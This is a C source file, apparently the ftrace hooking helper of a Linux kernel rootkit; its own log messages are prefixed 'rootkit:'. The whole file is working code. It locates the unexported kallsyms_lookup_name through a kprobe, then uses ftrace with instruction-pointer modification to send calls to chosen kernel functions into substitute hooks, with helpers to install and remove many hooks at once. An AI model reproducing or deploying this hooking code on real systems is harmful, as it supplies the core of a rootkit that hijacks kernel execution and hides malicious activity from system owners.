/*
 * Helper library for ftrace hooking kernel functions
 * Original Author: Harvey Phillips (xcellerator@gmx.com)
 * Edidted by: Began Bajrami
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include <linux/kprobes.h>
static struct kprobe kp = {
    // we want to probe the kallsyms_lookup_name function, so that we can get
    // the address of the function we want to hook without staticallt linking it
    // in this header
    .symbol_name = "kallsyms_lookup_name"};

#define HOOK(_name, _hook, _orig)                                              \
  {                                                                            \
      .name = (_name),                                                         \
      .function = (_hook),                                                     \
      .original = (_orig),                                                     \
  }

// Struct for hook information
struct ftrace_hook {
  const char *name;
  void *function;
  void *original;

  unsigned long address;
  struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook) {

  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);

  hook->address = kallsyms_lookup_name(hook->name);

  if (!hook->address) {
    printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
    return -ENOENT;
  }
  // prevents recursive loop
  *((unsigned long *)hook->original) = hook->address;
  return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs) {
  struct pt_regs *regs = ftrace_get_regs(fregs);
  struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

  if (!within_module(parent_ip, THIS_MODULE))
    regs->ip = (unsigned long)hook->function;
}

/* Assuming we've already set hook->name, hook->function and hook->original, we
 * can go ahead and install the hook with ftrace. This is done by setting the
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook) {
  int err;
  err = fh_resolve_hook_address(hook);
  if (err)
    return err;

  /* For many of function hooks (especially non-trivial ones), the $rip
   * register gets modified, so we have to alert ftrace to this fact. This
   * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
   * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
   * the built-in anti-recursion guard provided by ftrace is useless if
   * we're modifying $rip. This is why we have to implement our own checks
   * (see USE_FENTRY_OFFSET). */
  hook->ops.func = fh_ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                    FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
  if (err) {
    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
    printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
    return err;
  }

  return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook) {
  int err;
  err = unregister_ftrace_function(&hook->ops);
  if (err) {
    printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n",
           err);
  }

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
  if (err) {
    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
  }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
  int err;
  size_t i;

  for (i = 0; i < count; i++) {
    err = fh_install_hook(&hooks[i]);
    if (err)
      goto error;
  }
  return 0;

error:
  while (i != 0) {
    fh_remove_hook(&hooks[--i]);
  }
  return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
  size_t i;

  for (i = 0; i < count; i++)
    fh_remove_hook(&hooks[i]);
}
